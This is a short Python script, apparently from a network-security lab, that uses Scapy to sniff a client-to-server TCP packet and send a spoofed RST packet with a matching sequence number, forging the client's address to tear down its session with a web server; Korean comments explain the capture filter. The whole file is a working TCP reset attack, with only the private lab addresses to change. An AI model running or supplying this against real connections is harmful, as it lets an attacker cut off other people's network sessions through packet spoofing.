# tcp_reset.py
from scapy.all import IP, TCP, sniff, send

client_ip = "192.168.110.128"
server_ip = "192.168.110.129"
server_port = 80


def reset_session(packet):
    seq = packet[TCP].seq + len(packet[TCP].payload)

    spoofed_rst = (
        IP(src=client_ip, dst=server_ip) /
        TCP(sport=packet[TCP].sport, dport=server_port, flags="R", seq=seq)
    )
    send(spoofed_rst, verbose=False)


if __name__ == "__main__":
    sniff(
        # 방향을 명시: 클라이언트 -> 서버 패킷만 캡처한다.
        # (이 코드의 seq 계산과 sport=packet[TCP].sport 로직이
        #  이 방향을 전제로 하기 때문에 방향을 고정해야 정확하다.)
        filter=f"tcp and src host {client_ip} and dst host {server_ip} and dst port {server_port}",
        prn=reset_session,
        count=1,
        timeout=30,
    )